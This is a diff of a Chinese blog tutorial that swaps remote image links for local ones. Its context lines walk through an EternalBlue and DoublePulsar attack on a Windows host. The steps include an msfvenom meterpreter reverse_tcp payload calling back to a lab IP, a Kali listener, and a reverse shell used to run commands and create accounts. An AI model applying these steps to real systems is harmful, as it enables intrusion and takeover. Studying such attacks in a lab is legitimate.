@@ -24,7 +24,7 @@ tags: 网络安全
 
 首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：
 
-![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg "1.jpg")
+![1.jpg](post160/1.jpg)
 
 0x02
 
@@ -39,11 +39,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f 
 
 点击xshell如图位置
 
-![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg "3.jpg")
+![3.jpg](post160/3-162743458649210.jpg)
 
 打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图
 
-![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg "4.jpg")
+![4.jpg](post160/4.jpg)
 
 #### 第二步：配置kali使得kali处于监听状态
 
@@ -60,7 +60,7 @@ exploit
 ```
 看到如图即说明配置成功
 
-![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg "2.jpg")
+![2.jpg](post160/2.jpg)
 
 这时就可以将xshell最小化，等后边再用
 
@@ -70,7 +70,7 @@ exploit
 
 将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为"listeningposts"的文件夹，如图，不然运行会报错
 
-![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg "5.jpg")
+![5.jpg](post160/5.jpg)
 
 0x02
 
@@ -80,7 +80,7 @@ C:\win\fb.py
 ```
 然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图
 
-![6.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/6.jpg "6.jpg")
+![6.jpg](post160/6.jpg)
 
 0x03
 
@@ -90,11 +90,11 @@ use Eternalblue
 ```
 然后敲击回车，保持默认设置，除了下图俩需要选择，其他直接敲击回车使用默认配置即可
 
-![7.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/7.jpg "7.jpg")
+![7.jpg](post160/7.jpg)
 
 之后再敲几下回车开始攻击，得到结果如图
 
-![8.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/8.jpg "8.jpg")
+![8.jpg](post160/8.jpg)
 
 可以看到最后"Eternalblue Succeeded"显示成功，当然，不是所有攻击都会成功，需要一定运气的
 
@@ -107,20 +107,20 @@ use Doublepulsar
 
 然后会要求输入一些参数，比如系统位数、后门操作、后门路径等，除了下图中红框标出的部分，其他保持默认即可
 
-![9.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/9.jpg "9.jpg")
+![9.jpg](post160/9.jpg)
 
 接着输入后门路径，即我们之前用kali生成的s.dll，如下图
 
-![10.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/10.jpg "10.jpg")
+![10.jpg](post160/10.jpg)
 
 之后不断敲击回车开始在目标机执行s.dll，成功后如图
 
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/11.jpg "11.jpg")
+![11.jpg](post160/11.jpg)
 
 这时打开xshell可以看到已经成功反弹shell
 
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/12.jpg "12.jpg")
+![12.jpg](post160/12.jpg)
 
 然后就可以比如说输入shell模拟终端执行命令，创建账户，等等，总之服务器权限已经拿到了
 
-![13.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/13.jpg "13.jpg")
+![13.jpg](post160/13.jpg)
